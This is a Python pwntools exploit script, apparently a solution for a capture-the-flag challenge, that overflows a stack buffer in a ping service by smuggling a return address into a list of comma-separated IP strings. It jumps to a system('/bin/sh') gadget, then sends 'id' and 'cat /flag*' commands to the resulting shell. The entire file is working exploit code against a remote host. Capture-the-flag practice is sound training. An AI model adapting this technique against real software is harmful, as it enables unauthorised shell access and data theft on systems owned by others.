#!/usr/bin/env python3

from pwn import *
import time

exe = ELF("./injected_patched")
context.binary = exe

# Gadget in doit: lea rax, "/bin/sh"; mov rdi, rax; call system
SYSTEM_BINSH = 0x40132A


def addr_to_ip(addr):
    """
    Convert a 32-bit address to dotted-decimal IP notation.
    inet_aton stores in network byte order (big-endian).
    We want the resulting bytes to match the little-endian repr of addr.
    e.g. 0x40132a -> bytes 2a 13 40 00 -> IP "42.19.64.0"
    """
    return f"{addr & 0xFF}.{(addr >> 8) & 0xFF}.{(addr >> 16) & 0xFF}.{(addr >> 24) & 0xFF}"


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("challenges.cybersecuritychallenge.pt", 26101)
    return r


def main():
    r = conn()

    # Stack layout in store_and_ping (rbp-0x10 = 16-byte local buffer):
    #   g_i=0..3 -> inside buffer (rbp-0x10)
    #   g_i=4    -> saved RBP low
    #   g_i=5    -> saved RBP high
    #   g_i=6    -> return address low  (target: 0x40132a)
    #   g_i=7    -> return address high (target: 0x00000000)

    payload = [
        "8.8.8.8",                  # g_i=0
        "8.8.8.8",                  # g_i=1
        "8.8.8.8",                  # g_i=2
        "8.8.8.8",                  # g_i=3
        "8.8.8.8",                  # g_i=4 (saved RBP, don't care)
        "8.8.8.8",                  # g_i=5 (saved RBP, don't care)
        addr_to_ip(SYSTEM_BINSH),   # g_i=6 (return addr low)
        "0.0.0.0",                  # g_i=7 (return addr high)
    ]

    payload_str = ",".join(payload)

    r.recvuntil(b"IPs to ping (comma-separated):")
    r.sendline(payload_str.encode())

    # Wait for pings to finish and shell to spawn
    time.sleep(3)

    r.sendline(b"id")
    r.sendline(b"cat /flag*")
    r.sendline(b"cat flag*")

    data = r.recvall(timeout=5)
    print(data.decode(errors="replace"))


if __name__ == "__main__":
    main()
